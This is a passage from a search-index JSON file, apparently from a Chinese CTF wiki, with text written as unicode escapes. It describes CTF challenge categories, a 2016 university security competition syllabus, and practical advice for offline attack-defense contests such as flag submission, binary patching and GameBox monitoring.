\u7684\u8003\u9898\u8303\u56f4\u5176\u5b9e\u6bd4\u8f83\u5bbd\u5e7f\uff0c\u76ee\u524d\u4e5f\u6ca1\u6709\u592a\u660e\u786e\u7684\u89c4\u5b9a\u754c\u9650\u8bf4\u4f1a\u8003\u54ea\u4e9b\u5185\u5bb9\u3002\u4f46\u662f\u5c31\u76ee\u524d\u7684\u6bd4\u8d5b\u9898\u578b\u800c\u8a00\u7684\u8bdd\uff0c\u4e3b\u8981\u8fd8\u662f\u4f9d\u636e\u5e38\u89c1\u7684 Web \u7f51\u7edc\u653b\u9632\u3001RE \u9006\u5411\u5de5\u7a0b\u3001Pwn \u4e8c\u8fdb\u5236\u6f0f\u6d1e\u5229\u7528\u3001Crypto \u5bc6\u7801\u653b\u51fb\u3001Mobile \u79fb\u52a8\u5b89\u5168 \u4ee5\u53ca Misc \u5b89\u5168\u6742\u9879 \u6765\u8fdb\u884c\u5206\u7c7b\u3002 Web - \u7f51\u7edc\u653b\u9632 \u4e3b\u8981\u4ecb\u7ecd\u4e86 Web \u5b89\u5168\u4e2d\u5e38\u89c1\u7684\u6f0f\u6d1e\uff0c\u5982 SQL \u6ce8\u5165\u3001XSS\u3001CSRF\u3001\u6587\u4ef6\u5305\u542b\u3001\u6587\u4ef6\u4e0a\u4f20\u3001\u4ee3\u7801\u5ba1\u8ba1\u3001PHP \u5f31\u7c7b\u578b\u7b49\uff0cWeb \u5b89\u5168\u4e2d\u5e38\u89c1\u7684\u9898\u578b\u53ca\u89e3\u9898\u601d\u8def\uff0c\u63d0\u4f9b\u4e86\u4e00\u4e9b\u5e38\u7528\u7684\u5de5\u5177\u3002 Reverse Engineering - \u9006\u5411\u5de5\u7a0b \u4e3b\u8981\u4ecb\u7ecd\u4e86\u9006\u5411\u5de5\u7a0b\u4e2d\u7684\u5e38\u89c1\u9898\u578b\u3001\u5de5\u5177\u5e73\u53f0\u3001\u89e3\u9898\u601d\u8def\uff0c\u8fdb\u9636\u90e8\u5206\u4ecb\u7ecd\u4e86\u9006\u5411\u5de5\u7a0b\u4e2d\u5e38\u89c1\u7684\u8f6f\u4ef6\u4fdd\u62a4\u3001\u53cd\u7f16\u8bd1\u3001\u53cd\u8c03\u8bd5\u3001\u52a0\u58f3\u8131\u58f3\u6280\u672f\u3002 Pwn - \u4e8c\u8fdb\u5236\u6f0f\u6d1e\u5229\u7528 Pwn \u9898\u76ee\u4e3b\u8981\u8003\u5bdf\u4e8c\u8fdb\u5236\u6f0f\u6d1e\u7684\u53d1\u6398\u548c\u5229\u7528\uff0c\u9700\u8981\u5bf9\u8ba1\u7b97\u673a\u64cd\u4f5c\u7cfb\u7edf\u5e95\u5c42\u6709\u4e00\u5b9a\u7684\u4e86\u89e3\u3002\u5728 CTF \u7ade\u8d5b\u4e2d\uff0cPWN \u9898\u76ee\u4e3b\u8981\u51fa\u73b0\u5728 Linux \u5e73\u53f0\u4e0a\u3002 Crypto - \u5bc6\u7801\u653b\u51fb \u4e3b\u8981\u5305\u62ec\u53e4\u5178\u5bc6\u7801\u5b66\u548c\u73b0\u4ee3\u5bc6\u7801\u5b66\u4e24\u90e8\u5206\u5185\u5bb9\uff0c\u53e4\u5178\u5bc6\u7801\u5b66\u8da3\u5473\u6027\u5f3a\uff0c\u79cd\u7c7b\u7e41\u591a\uff0c\u73b0\u4ee3\u5bc6\u7801\u5b66\u5b89\u5168\u6027\u9ad8\uff0c\u5bf9\u7b97\u6cd5\u7406\u89e3\u7684\u8981\u6c42\u8f83\u9ad8\u3002 Mobile - \u79fb\u52a8\u5b89\u5168 \u4e3b\u8981\u4ecb\u7ecd\u4e86\u5b89\u5353\u9006\u5411\u4e2d\u7684\u5e38\u7528\u5de5\u5177\u548c\u4e3b\u8981\u9898\u578b\uff0c\u5b89\u5353\u9006\u5411\u5e38\u5e38\u9700\u8981\u4e00\u5b9a\u7684\u5b89\u5353\u5f00\u53d1\u77e5\u8bc6\uff0ciOS \u9006\u5411\u9898\u76ee\u5728 CTF \u7ade\u8d5b\u4e2d\u8f83\u5c11\u51fa\u73b0\uff0c\u56e0\u6b64\u4e0d\u4f5c\u8fc7\u591a\u4ecb\u7ecd\u3002 Misc - \u5b89\u5168\u6742\u9879 \u4ee5\u8bf8\u845b\u5efa\u4f1f\u7ffb\u8bd1\u7684\u300a\u7ebf\u4e0a\u5e7d\u7075\uff1a\u4e16\u754c\u5934\u53f7\u9ed1\u5ba2\u7c73\u7279\u5c3c\u514b\u81ea\u4f20\u300b\u548c\u4e00\u4e9b\u5178\u578b MISC \u9898\u4e3a\u5207\u5165\u70b9\uff0c\u5185\u5bb9\u4e3b\u8981\u5305\u62ec\u4fe1\u606f\u641c\u96c6\u3001\u7f16\u7801\u5206\u6790\u3001\u53d6\u8bc1\u5206\u6790\u3001\u9690\u5199\u5206\u6790\u7b49\u3002 \u5168\u56fd\u5927\u5b66\u751f\u4fe1\u606f\u5b89\u5168\u7ade\u8d5b - \u7ade\u8d5b\u5185\u5bb9 \u00b6 2016 \u5e74\u5168\u56fd\u5927\u5b66\u751f\u4fe1\u606f\u5b89\u5168\u7ade\u8d5b\u5f00\u59cb\u8bbe\u7acb\u521b\u65b0\u5b9e\u8df5\u6280\u80fd\u8d5b\uff0c\u91c7\u53d6\u7684\u5c31\u662f\u4f20\u7edf\u7684 CTF \u8d5b\u5236\u3002\u5728\u300a2016 \u5e74\u5168\u56fd\u5927\u5b66\u751f\u4fe1\u606f\u5b89\u5168\u7ade\u8d5b\u53c2\u8d5b\u6307\u5357\u300b\u4e2d\u4e3b\u529e\u65b9\u7ed9\u51fa\u7684\u7ade\u8d5b\u5185\u5bb9\u76f8\u5bf9\u5168\u9762\uff0c\u503c\u5f97\u53c2\u8003\u3002 \u7cfb\u7edf\u5b89\u5168\u3002\u6d89\u53ca\u64cd\u4f5c\u7cfb\u7edf\u548c Web \u7cfb\u7edf\u5b89\u5168\uff0c\u5305\u62ec Web \u7f51\u7ad9\u591a\u79cd\u8bed\u8a00\u6e90\u4ee3\u7801\u5ba1\u8ba1\u5206\u6790\uff08\u7279\u522b\u662f PHP\uff09\u3001\u6570\u636e\u5e93\u7ba1\u7406\u548c SQL \u64cd\u4f5c\u3001Web \u6f0f\u6d1e\u6316\u6398\u548c\u5229\u7528\uff08\u5982 SQL \u6ce8\u5165\u548c XSS\uff09\u3001\u670d\u52a1\u5668\u63d0\u6743\u3001\u7f16\u5199\u4ee3\u7801\u8865\u4e01\u5e76\u4fee\u590d\u7f51\u7ad9\u6f0f\u6d1e\u7b49\u5b89\u5168\u6280\u80fd\u3002 \u8f6f\u4ef6\u9006\u5411\u3002\u6d89\u53ca Windows/Linux/Android \u5e73\u53f0\u7684\u591a\u79cd\u7f16\u7a0b\u6280\u672f\uff0c\u8981\u6c42\u5229\u7528\u5e38\u7528\u5de5\u5177\u5bf9\u6e90\u4ee3\u7801\u53ca\u4e8c\u8fdb\u5236\u6587\u4ef6\u8fdb\u884c\u9006\u5411\u5206\u6790\uff0c\u638c\u63e1 Android \u79fb\u52a8\u5e94\u7528 APK \u6587\u4ef6\u7684\u9006\u5411\u5206\u6790\uff0c\u638c\u63e1\u52a0\u89e3\u5bc6\u3001\u5185\u6838\u7f16\u7a0b\u3001\u7b97\u6cd5\u3001\u53cd\u8c03\u8bd5\u548c\u4ee3\u7801\u6df7\u6dc6\u6280\u672f\u3002 \u6f0f\u6d1e\u6316\u6398\u548c\u5229\u7528\u3002\u638c\u63e1 C/C++/Python/PHP/Java/Ruby/\u6c47\u7f16 \u7b49\u8bed\u8a00\uff0c\u6316\u6398 Windows/Linux\uff08x86/x86\uff3f64 \u5e73\u53f0\uff09\u4e8c\u8fdb\u5236\u7a0b\u5e8f\u6f0f\u6d1e\uff0c\u638c\u63e1\u7f13\u51b2\u533a\u6ea2\u51fa\u548c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u653b\u51fb\uff0c\u7f16\u5199\u5e76\u5229\u7528 shellcode\u3002 \u5bc6\u7801\u5b66\u539f\u7406\u53ca\u5e94\u7528\u3002\u638c\u63e1\u53e4\u5178\u5bc6\u7801\u5b66\u548c\u73b0\u4ee3\u5bc6\u7801\u5b66\uff0c\u5206\u6790\u5bc6\u7801\u7b97\u6cd5\u548c\u534f\u8bae\uff0c\u8ba1\u7b97\u5bc6\u94a5\u548c\u8fdb\u884c\u52a0\u89e3\u5bc6\u64cd\u4f5c\u3002 \u5176\u4ed6\u5185\u5bb9\u3002\u5305\u62ec\u4fe1\u606f\u641c\u96c6\u80fd\u529b\uff0c\u7f16\u7a0b\u80fd\u529b\u3001\u79fb\u52a8\u5b89\u5168\u3001\u4e91\u8ba1\u7b97\u5b89\u5168\u3001\u53ef\u4fe1\u8ba1\u7b97\u3001\u81ea\u4e3b\u53ef\u63a7\u3001\u9690\u5199\u672f\u548c\u4fe1\u606f\u9690\u85cf\u3001\u8ba1\u7b97\u673a\u53d6\u8bc1\uff08Forensics\uff09\u6280\u672f\u548c\u6587\u4ef6\u6062\u590d\u6280\u80fd\uff0c\u8ba1\u7b97\u673a\u7f51\u7edc\u57fa\u7840\u4ee5\u53ca\u5bf9\u7f51\u7edc\u6d41\u91cf\u7684\u5206\u6790\u80fd\u529b\u3002","title":"CTF \u7ade\u8d5b\u5185\u5bb9"},{"location":"introduction/content/#-","text":"2016 \u5e74\u5168\u56fd\u5927\u5b66\u751f\u4fe1\u606f\u5b89\u5168\u7ade\u8d5b\u5f00\u59cb\u8bbe\u7acb\u521b\u65b0\u5b9e\u8df5\u6280\u80fd\u8d5b\uff0c\u91c7\u53d6\u7684\u5c31\u662f\u4f20\u7edf\u7684 CTF \u8d5b\u5236\u3002\u5728\u300a2016 \u5e74\u5168\u56fd\u5927\u5b66\u751f\u4fe1\u606f\u5b89\u5168\u7ade\u8d5b\u53c2\u8d5b\u6307\u5357\u300b\u4e2d\u4e3b\u529e\u65b9\u7ed9\u51fa\u7684\u7ade\u8d5b\u5185\u5bb9\u76f8\u5bf9\u5168\u9762\uff0c\u503c\u5f97\u53c2\u8003\u3002 \u7cfb\u7edf\u5b89\u5168\u3002\u6d89\u53ca\u64cd\u4f5c\u7cfb\u7edf\u548c Web \u7cfb\u7edf\u5b89\u5168\uff0c\u5305\u62ec Web \u7f51\u7ad9\u591a\u79cd\u8bed\u8a00\u6e90\u4ee3\u7801\u5ba1\u8ba1\u5206\u6790\uff08\u7279\u522b\u662f PHP\uff09\u3001\u6570\u636e\u5e93\u7ba1\u7406\u548c SQL \u64cd\u4f5c\u3001Web \u6f0f\u6d1e\u6316\u6398\u548c\u5229\u7528\uff08\u5982 SQL \u6ce8\u5165\u548c XSS\uff09\u3001\u670d\u52a1\u5668\u63d0\u6743\u3001\u7f16\u5199\u4ee3\u7801\u8865\u4e01\u5e76\u4fee\u590d\u7f51\u7ad9\u6f0f\u6d1e\u7b49\u5b89\u5168\u6280\u80fd\u3002 \u8f6f\u4ef6\u9006\u5411\u3002\u6d89\u53ca Windows/Linux/Android \u5e73\u53f0\u7684\u591a\u79cd\u7f16\u7a0b\u6280\u672f\uff0c\u8981\u6c42\u5229\u7528\u5e38\u7528\u5de5\u5177\u5bf9\u6e90\u4ee3\u7801\u53ca\u4e8c\u8fdb\u5236\u6587\u4ef6\u8fdb\u884c\u9006\u5411\u5206\u6790\uff0c\u638c\u63e1 Android \u79fb\u52a8\u5e94\u7528 APK \u6587\u4ef6\u7684\u9006\u5411\u5206\u6790\uff0c\u638c\u63e1\u52a0\u89e3\u5bc6\u3001\u5185\u6838\u7f16\u7a0b\u3001\u7b97\u6cd5\u3001\u53cd\u8c03\u8bd5\u548c\u4ee3\u7801\u6df7\u6dc6\u6280\u672f\u3002 \u6f0f\u6d1e\u6316\u6398\u548c\u5229\u7528\u3002\u638c\u63e1 C/C++/Python/PHP/Java/Ruby/\u6c47\u7f16 \u7b49\u8bed\u8a00\uff0c\u6316\u6398 Windows/Linux\uff08x86/x86\uff3f64 \u5e73\u53f0\uff09\u4e8c\u8fdb\u5236\u7a0b\u5e8f\u6f0f\u6d1e\uff0c\u638c\u63e1\u7f13\u51b2\u533a\u6ea2\u51fa\u548c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u653b\u51fb\uff0c\u7f16\u5199\u5e76\u5229\u7528 shellcode\u3002 \u5bc6\u7801\u5b66\u539f\u7406\u53ca\u5e94\u7528\u3002\u638c\u63e1\u53e4\u5178\u5bc6\u7801\u5b66\u548c\u73b0\u4ee3\u5bc6\u7801\u5b66\uff0c\u5206\u6790\u5bc6\u7801\u7b97\u6cd5\u548c\u534f\u8bae\uff0c\u8ba1\u7b97\u5bc6\u94a5\u548c\u8fdb\u884c\u52a0\u89e3\u5bc6\u64cd\u4f5c\u3002 \u5176\u4ed6\u5185\u5bb9\u3002\u5305\u62ec\u4fe1\u606f\u641c\u96c6\u80fd\u529b\uff0c\u7f16\u7a0b\u80fd\u529b\u3001\u79fb\u52a8\u5b89\u5168\u3001\u4e91\u8ba1\u7b97\u5b89\u5168\u3001\u53ef\u4fe1\u8ba1\u7b97\u3001\u81ea\u4e3b\u53ef\u63a7\u3001\u9690\u5199\u672f\u548c\u4fe1\u606f\u9690\u85cf\u3001\u8ba1\u7b97\u673a\u53d6\u8bc1\uff08Forensics\uff09\u6280\u672f\u548c\u6587\u4ef6\u6062\u590d\u6280\u80fd\uff0c\u8ba1\u7b97\u673a\u7f51\u7edc\u57fa\u7840\u4ee5\u53ca\u5bf9\u7f51\u7edc\u6d41\u91cf\u7684\u5206\u6790\u80fd\u529b\u3002","title":"\u5168\u56fd\u5927\u5b66\u751f\u4fe1\u606f\u5b89\u5168\u7ade\u8d5b - \u7ade\u8d5b\u5185\u5bb9"},{"location":"introduction/experience/","text":"\u9996\u5148\u6b63\u5e38\u6bd4\u8d5b\u4f1a\u63d0\u4f9b\u63d0\u4ea4 flag \u7684\u63a5\u53e3\uff0c\u63a5\u53e3\u5730\u5740\u7c7b\u4f3c http://172.16.4.1/Common/submitAnswer \u3002\u4e00\u822c\u6211\u4eec\u9700\u8981\u6839\u636e\u4e3b\u529e\u65b9\u7ed9\u51fa\u7684\u6587\u6863\u8981\u6c42\u901a\u8fc7\u63a5\u53e3\u63d0\u4ea4 flag\u3002\u5728\u6bd4\u8d5b\u4e2d\u8981\u6c42\u63a5\u53e3\u5730\u5740\u4f7f\u7528 Post \u65b9\u5f0f\u63d0\u4ea4\uff0c\u63d0\u4ea4\u65f6\u5e26\u4e24\u4e2a\u53c2\u6570\uff0c\u4e00\u4e2a\u662f Answer \uff0c\u5176\u503c\u4e3a\u83b7\u53d6\u5230\u7684 flag \u5b57\u7b26\u4e32\uff0c\u800c\u53e6\u4e00\u4e2a\u5219\u662f token \uff0c\u5176\u503c\u4e3a\u5404\u4e2a\u961f\u4f0d\u7684\u961f\u4f0d Token\u3002 \u7136\u540e\u6bd4\u8d5b\u65f6\u4e3b\u529e\u65b9\u4e5f\u4f1a\u7ed9\u6bcf\u4e2a\u53c2\u8d5b\u961f\u4f0d\u63d0\u4f9b\u4e00\u53f0\u7528\u4e8e \u5206\u6790\u7f51\u7edc\u6d41\u91cf\u7684\u865a\u62df\u673a \uff0c\u9009\u624b\u9700\u8981\u8bbf\u95ee\u5730\u5740\u4e0b\u8f7d\u6d41\u91cf\u6587\u4ef6\u8fdb\u884c\u5206\u6790\u3002 \u5173\u6ce8 Gamebox \u72b6\u6001 \u00b6 \u6bd4\u8d5b\u4e2d\u53ef\u4ee5\u67e5\u770b\u5df1\u65b9\u548c\u654c\u65b9 GameBox \u72b6\u6001\u3002\u65f6\u523b\u5173\u6ce8\u53ef\u4ee5\u5c3d\u65e9\u83b7\u53d6\u6bd4\u8d5b\u4fe1\u606f\uff0c\u6839\u636e\u4fe1\u606f\u505a\u51fa\u8c03\u6574\u3002 \u5bf9\u4e8e\u5df1\u65b9 GameBox\uff0c\u6709\u5b58\u5728\u5982\u4e0b\u539f\u56e0\u9020\u6210 GameBox \u88ab down \u6389\uff1a \u4e3b\u529e\u65b9\u88c1\u5224\u7cfb\u7edf\u5b58\u5728\u5931\u8bef\uff0c\u8bef\u5224 GameBox \u4e3a\u4e0d\u53ef\u7528\u72b6\u6001\u3002\u8fd9\u79cd\u60c5\u51b5\u4e00\u822c\u5728\u6bd4\u8d5b\u5f00\u59cb\u524d\u53ef\u4ee5\u53d1\u73b0\uff0c\u5982\u679c\u53d1\u73b0\u5b58\u5728\u8fd9\u79cd\u60c5\u51b5\uff0c\u8981\u5c3d\u65e9\u5411\u5de5\u4f5c\u4eba\u5458\u793a\u610f\u5904\u7406\u4ee5\u51cf\u5c11\u635f\u5931\u3002 \u7a0b\u5e8f patch \u5931\u8bef\u5bfc\u81f4\u670d\u52a1\u4e0d\u53ef\u7528\u3002\u5728\u7a0b\u5e8f patch \u5b8c\u4e4b\u540e\u8981\u8fdb\u5165\u4e0b\u4e00\u8f6e\u5173\u6ce8 GameBox \u72b6\u6001\uff0c\u5982\u679c patch \u5931\u8bef\u5bfc\u81f4\u4e0d\u53ef\u7528\uff0c\u9700\u8981\u53ca\u65f6\u633d\u6551\u3002\u4f46\u662f\u4e5f\u4e0d\u8981\u8fc7\u5ea6\u62c5\u5fc3\u628a\u539f\u6765\u7684\u672a\u4fee\u8865\u8fc7\u7684\u6f0f\u6d1e\u7a0b\u5e8f\u6362\u56de\u53bb\u3002\u56e0\u4e3a down \u6389\u662f\u6240\u6709\u961f\u5e73\u5206\u5f97\u5f88\u5c11\u7684\u5206\uff0c\u800c\u76f4\u63a5\u4e0a\u6f0f\u6d1e\u7a0b\u5e8f\u4f1a\u4f7f\u7684\u5f3a\u52bf\u7684\u961f\u4f0d\u76f4\u63a5\u5229\u7528\u5f97\u5230\u5f88\u9ad8\u7684\u5f97\u5206\u3002\u6240\u4ee5\u8981\u4f9d\u636e\u5177\u4f53\u60c5\u51b5\u5bf9\u5f85\u3002 \u5bf9\u624b\u4e0d\u6b63\u5f53\u653b\u51fb\u5bfc\u81f4 GameBox \u4e0d\u53ef\u7528\u3002\u5982\u679c\u53d1\u73b0\uff0c\u9700\u8981\u53ca\u65f6\u8865\u6551\u3002 \u4e3b\u529e\u65b9\u52a0\u5f3a\u7a0b\u5e8f check\u3002\u8fd9\u79cd\u60c5\u51b5\u4e3b\u529e\u65b9\u4f1a\u5bf9\u6240\u6709\u961f\u5458\u8fdb\u884c\u901a\u77e5\u516c\u544a\u3002\u5728 GameBox \u72b6\u6001\u5899\u4e0a\u7684\u72b6\u6001\u4f1a\u663e\u793a\u8be5\u9898\u7684\u5404\u961f GameBox \u5927\u9762\u79ef\u4e0d\u53ef\u7528\u3002 \u5bf9\u4e8e\u654c\u65b9 GameBox\u3002\u6211\u4eec\u53ef\u4ee5\u83b7\u53d6\u4ee5\u4e0b\u4fe1\u606f\u3002 \u6839\u636e\u653b\u51fb\u6d41\u89c2\u6d4b\u54ea\u4e9b\u961f\u4f0d\u7684 GameBox \u6ca1\u6709\u9632\u5fa1\u6210\u529f\u3002\u9488\u5bf9\u8fd9\u4e9b\u961f\u4f0d\u53ef\u4ee5\u66f4\u591a\u5730\u5b9e\u73b0\u653b\u51fb \u6709\u961f\u4f0d\u62ff\u51fa\u4e00\u8840\u65f6\u3002\u53ef\u4ee5\u6839\u636e\u5404\u961f GameBox \u72b6\u6001\u63a8\u65ad\u51fa\u4e00\u8840\u961f\u4f0d\u662f\u5426\u5df2\u7ecf\u5199\u51fa\u5229\u7528\u811a\u672c\u3002\u5199\u51fa\u5229\u7528\u811a\u672c\u540e\u53ef\u4ee5\u89c2\u6d4b\u5df1\u65b9\u662f\u5426\u505a\u597d\u4e86\u9632\u5fa1\u3002 \u5206\u6e05\u533a\u6bb5\u4e0e\u7aef\u53e3 \u00b6 \u6bd4\u8d5b\u8fc7\u7a0b\u4e2d\u4f1a\u4e3b\u529e\u65b9\u4f1a\u5b89\u6392\u597d\u5408\u7406\u7684\u7f51\u6bb5\u5206\u5e03\u3002 \u7ef4\u62a4\u7684\u65f6\u5019\u9700\u8981\u8fde\u63a5\u5230\u672c\u961f GameBox \u6240\u5728\u7f51\u6bb5\u4e0a\uff0c\u6839\u636e\u4e3b\u529e\u65b9\u63d0\u4f9b\u7684 CTF \u8d26\u53f7\u4e0e\u5bc6\u7801\u767b\u5f55\u3002\u800c\u4e0e\u5176\u4ed6\u961f\u4f0d\u7684 GameBox \u4ea4\u4e92\u65f6\u5219\u9700\u8981\u8fde\u63a5\u5230\u5bf9\u5e94\u7684\u7f51\u6bb5\u91cc\u4e0e\u6f0f\u6d1e\u7a0b\u5e8f\u8fdb\u884c\u4ea4\u4e92\u3002\u63d0\u4ea4 flag \u5219\u9700\u8981\u5230\u6307\u5b9a\u7684\u7b54\u9898\u5e73\u53f0\u4e0a\u63d0\u4ea4\u3002 Warning \u8fd9\u91cc\u5c24\u5176\u9700\u8981\u6ce8\u610f\u7684\u5c31\u662f\u7aef\u53e3\u3002\u5982\u679c\u7aef\u53e3\u5728\u4e0d\u8f7b\u6613\u95f4\u5f04\u9519\u7684\u8bdd\uff0c\u8fd9\u6837\u7684\u9519\u8bef\u662f\u633a\u96be\u5bdf\u89c9\u5230\u7684\uff0c\u800c\u8fd9\u6837\u7684\u5931\u8bef\u4e5f\u4f1a\u5e26\u6765\u4e0d\u5fc5\u8981\u7684\u635f\u5931\u3002\u751a\u81f3\u4f1a\u51fa\u73b0\u957f\u65f6\u95f4\u65e0\u6cd5\u63d0\u4ea4 flag \u7684\u81f4\u547d\u60c5\u51b5\u3002\u6240\u4ee5\u9700\u8981\u5c0f\u5fc3\u6ce8\u610f\u3002 \u670d\u52a1 patch \u4e0e\u9632\u5fa1 \u00b6 \u7a0b\u5e8f patch \u8981\u5408\u7406\uff0c\u7b26\u5408\u88c1\u5224\u7cfb\u7edf check \u6761\u4ef6\u3002\u867d\u7136\u7cfb\u7edf\u7684 check \u662f check \u54ea\u91cc\u5e76\u672a\u516c\u5f00\uff0c\u4f46\u662f\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u7cfb\u7edf\u662f\u4e0d\u4f1a\u8fc7\u5ea6\u4e3a\u96be\u7684\u3002 \u7a0b\u5e8f patch \u4f7f\u7528 IDA \u8fdb\u884c\u4fee\u6539\uff0cIDA \u63d0\u4f9b\u4e86\u4e09\u79cd\u65b9\u5f0f\u7684 patch\uff1abyte\uff0cword\uff0cassemble.\u5176\u4e2d\u5b57\u8282\u7801\u4fee\u6539\u6bd4\u8f83\u597d\u7528\u3002\u56e0\u4e3a\u9010\u5b57\u8282\u4fee\u6539\u4e0d\u9700\u8003\u8651\u6c47\u7f16\u6307\u4ee4\uff0c\u4e00\u822c\u8fd9\u6837\u7684\u4fee\u6539\u6539\u52a8\u4e5f\u5f88\u5c0f\uff0c\u5728\u4e00\u5b9a\u573a\u5408\u4e0b\u5341\u5206\u597d\u7528\u3002\u6c47\u7f16\u6307\u4ee4\u7ea7\u522b\u7684\u4fee\u6539\u867d\u7136\u65b9\u4fbf\u4e0d\u9700\u8981\u4fee\u6539\u5b57\u8282\u7801\uff0c\u4f46\u662f\u4e5f\u9020\u6210\u4e86\u4e00\u5b9a\u7684\u4e0d\u4fbf\u3002\u6bd4\u5982\u9700\u8981\u989d\u5916\u8003\u8651\u6c47\u7f16\u6307\u4ee4\u7684\u957f\u5ea6\uff0c\u7ed3\u6784\u662f\u5426\u5408\u7406\u5b8c\u6574\uff0c\u903b\u8f91\u662f\u5426\u548c\u539f\u6765\u4e00\u6837\uff0c\u4fee\u6539\u7684\u6c47\u7f16\u6307\u4ee4\u662f\u5426\u5408\u6cd5\u7b49\u95ee\u9898\u3002 \u5728 patch \u7a0b\u5e8f\u65f6\u8981\u8bb0\u5f97\u5907\u4efd\u539f\u6765\u7684\u6f0f\u6d1e\u7a0b\u5e8f\uff0c\u4ee5\u4f9b\u961f\u4f0d\u5206\u6790\u4f7f\u7528\u3002\u5728\u4e0a\u4f20 patch \u7684\u65f6\u5019\u5e94\u8be5\u5148\u5220\u9664\u539f\u6765\u7684\u6f0f\u6d1e\u7a0b\u5e8f\uff0c\u7136\u540e\u5c06 patch \u8fc7\u7684\u7a0b\u5e8f\u590d\u5236\u8fdb\u53bb\uff0c\u590d\u5236\u8fdb\u53bb\u4e4b\u540e\u8fd8\u9700\u8981\u7ed9\u7a0b\u5e8f\u8d4b\u4e88\u76f8\u5e94\u7684\u6743\u9650\u3002 \u4e00\u822c\u6bd4\u8d5b\u4e2d\uff0c\u6f0f\u6d1e\u7a0b\u5e8f\u4f1a\u6709\u5341\u51e0\u5904\u9700\u8981 patch \u7684\u5730\u65b9\u3002Patch \u7684\u65f6\u5019\u4e0d\u4ec5\u8981\u8bb2\u7a76\u6709\u6548\u5408\u7406\uff0c\u8fd8\u8981\u6ee1\u8db3\u80fd\u591f\u5728\u4e00\u5b9a\u7a0b\u5ea6\u4e0a\u9632\u8303\u6216\u6df7\u6dc6\u5bf9\u624b\u7684\u5206\u6790\u3002 \u6784\u9020\u811a\u672c\u6846\u67b6\u5feb\u901f\u5c55\u5f00\u653b\u51fb \u00b6 \u5728\u653b\u9632\u6bd4\u8d5b\u8fc7\u7a0b\u4e2d\uff0c\u4e00\u8840\u663e\u5f97\u5c24\u5176\u91cd\u8981\u3002\u56e0\u6b64\u6709\u4e00\u4e2a\u653b\u51fb\u811a\u672c\u6846\u67b6\u662f\u975e\u5e38\u6709\u5229\u7684\u3002\u5feb\u901f\u5f00\u53d1\u653b\u51fb\u811a\u672c\uff0c\u53ef\u4ee5\u5728\u524d\u671f\u4fdd\u6301\u4f18\u52bf\u5730\u4f4d\uff0c\u4e5f\u53ef\u4ee5\u5728\u4e0d\u65ad\u62ff\u5206\u7684\u540c\u65f6\u7701\u4e0b\u65f6\u95f4\u53bb\u505a\u597d\u9632\u5fa1\u3002 \u6bd4\u8d5b\u7684\u4e00\u4e9b\u7b56\u7565 \u00b6 \u5728\u6bd4\u8d5b\u8fc7\u7a0b\u4e2d\uff0c\u4e0d\u5b9c\u6b7b\u8017\u5728\u4e00\u9053\u9898\u4e0a\uff0c\u7531\u4e8e\u4e00\u8840\u7684\u4f18\u52bf\u6027\uff0c\u5728\u6bd4\u8d5b\u8fc7\u7a0b\u4e2d\u66f4\u5e94\u8be5\u5168\u9762\u4e86\u89e3\u8d5b\u9898\u96be\u5ea6\uff0c\u5148\u4ece \u7b80\u5355\u9898 \u5f00\u59cb\u8fdb\u884c\u5206\u6790\uff0c\u6b65\u6b65\u4e3a\u8425\u3002 \u6bd4\u8d5b\u8fc7\u7a0b\u4e2d\uff0c\u4e24\u6781\u4f1a\u4e25\u91cd\u5206\u5316\u3002\u5e94\u8be5\u7740\u529b\u6253\u51fb\u548c\u81ea\u5df1\u5b9e\u529b\u76f8\u5f53\u548c\u6bd4\u81ea\u5df1\u961f\u4f0d\u66f4\u5f3a\u7684\u961f\u4f0d\uff0c\u5c24\u5176\u662f\u5206\u6570\u76f8\u5dee\u65e0\u51e0\u7684\u60c5\u51b5\u4e0b\uff0c\u66f4\u8981\u4e25\u9632\u4e25\u5b88\u3002 \u6bd4\u8d5b\u4e2d NPC \u4f1a\u4e0d\u5b9a\u65f6\u53d1\u51fa\u653b\u51fb\u6d41\u91cf\u3002\u4ece\u653b\u51fb\u6d41\u91cf\u4e2d\u53ef\u4ee5\u5f97\u5230 payload\u3002 \u4e00\u5b9a\u8981\u628a NPC \u5f80\u6b7b\u91cc\u6253\u3002 \u5728\u5f00\u8d5b\u521d\u53ef\u4ee5\u5c06\u6240\u6709\u7684\u7ba1\u7406\u5bc6\u7801\u90fd\u8bbe\u7f6e\u4e3a\u540c\u4e00\u4e2a\u5bc6\u7801\uff0c\u8fd9\u6837\u65b9\u4fbf\u961f\u5458\u767b\u5f55\u7ba1\u7406\u3002\u5728\u521d\u671f\u5c06\u6240\u6709\u6587\u4ef6\u5907\u4efd\u4e0b\u6765\u4f9b\u961f\u5185\u5206\u4eab\u3002","title":"\u7ebf\u4e0b\u653b\u9632\u7ecf\u9a8c\u5c0f\u7ed3"},{"location":"introduction/experience/#gamebox","text":"\u6bd4\u8d5b\u4e2d\u53ef\u4ee5\u67e5\u770b\u5df1\u65b9\u548c\u654c\u65b9 GameBox \u72b6\u6001\u3002\u65f6\u523b\u5173\u6ce8\u53ef\u4ee5\u5c3d\u65e9\u83b7\u53d6\u6bd4\u8d5b\u4fe1\u606f\uff0c\u6839\u636e\u4fe1\u606f\u505a\u51fa\u8c03\u6574\u3002 \u5bf9\u4e8e\u5df1\u65b9 GameBox\uff0c\u6709\u5b58\u5728\u5982\u4e0b\u539f\u56e0\u9020\u6210 GameBox \u88ab down \u6389\uff1a \u4e3b\u529e\u65b9\u88c1\u5224\u7cfb\u7edf\u5b58\u5728\u5931\u8bef\uff0c\u8bef\u5224 GameBox \u4e3a\u4e0d\u53ef\u7528\u72b6\u6001\u3002\u8fd9\u79cd\u60c5\u51b5\u4e00\u822c\u5728\u6bd4\u8d5b\u5f00\u59cb\u524d\u53ef\u4ee5\u53d1\u73b0\uff0c\u5982\u679c\u53d1\u73b0\u5b58\u5728\u8fd9\u79cd\u60c5\u51b5\uff0c\u8981\u5c3d\u65e9\u5411\u5de5\u4f5c\u4eba\u5458\u793a\u610f\u5904\u7406\u4ee5\u51cf\u5c11\u635f\u5931\u3002 \u7a0b\u5e8f patch \u5931\u8bef\u5bfc\u81f4\u670d\u52a1\u4e0d\u53ef\u7528\u3002\u5728\u7a0b\u5e8f patch \u5b8c\u4e4b\u540e\u8981\u8fdb\u5165\u4e0b\u4e00\u8f6e\u5173\u6ce8 GameBox \u72b6\u6001\uff0c\u5982\u679c patch 